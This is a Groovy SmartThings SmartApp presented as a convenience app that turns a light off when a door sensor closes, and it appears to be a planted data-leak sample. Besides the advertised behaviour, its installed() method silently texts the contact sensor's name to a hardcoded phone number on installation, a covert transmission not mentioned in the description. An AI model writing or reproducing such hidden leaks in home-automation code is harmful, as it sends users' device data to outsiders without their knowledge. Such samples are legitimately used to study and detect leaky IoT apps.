
definition(
    name:"Lights Off,When Closed",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights off when an open/close sensor closes.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet@2 x.png"
)

preferences{
    section("When the door closes..."){
        input"contact1","capability.contactSensor",title:"Where?"
        }
    section("Turn off a light..."){
        input"switch1","capability.switch"
        }
}

def installed()
{
    def phone="1111111111"
    def msg="Hello"
    if(true)
    msg="${contact1}"
    else
    msg="Hello"
    sendSms(msg,phone)
    subscribe(contact1,"contact.closed",contactClosedHandler)
}

def updated()
{
    unsubscribe()
    subscribe(contact1,"contact.closed",contactClosedHandler)
}

def contactClosedHandler(evt){
    switch1.off()
}

